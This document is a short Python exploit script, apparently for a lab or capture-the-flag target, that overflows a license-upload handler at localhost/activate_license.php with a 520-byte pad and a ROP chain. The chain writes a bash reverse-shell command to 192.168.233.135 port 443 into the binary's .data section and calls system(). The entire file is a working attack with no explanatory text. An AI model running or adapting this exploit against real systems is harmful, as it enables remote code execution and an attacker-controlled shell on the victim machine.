#!/usr/bin/python3
from pwn import p64
import requests

offset = 520
junk = b"A" * offset

binary_base = 0x555555554000
libc_base = 0x7ffff7b56000

command = b"bash -c 'bash -i >& /dev/tcp/192.168.233.135/443 0>&1'"

payload =  b""
payload += junk

for i in range(0, len(command), 8):
    payload += p64(libc_base + 0x26796)         # pop rdi; ret;
    payload += p64(binary_base + 0x4000 + i)    # .data
    payload += p64(libc_base + 0x2890f)         # pop rsi; ret;
    payload += command[i:i+8].ljust(8, b"\x00") # string
    payload += p64(libc_base + 0x603b2)         # mov qword ptr [rdi], rsi; ret;

payload += p64(libc_base + 0x026796) # pop rdi; ret;
payload += p64(binary_base + 0x4000) # .data
payload += p64(libc_base + 0x048e50) # system()

requests.post("http://localhost/activate_license.php", files={"licensefile": payload})
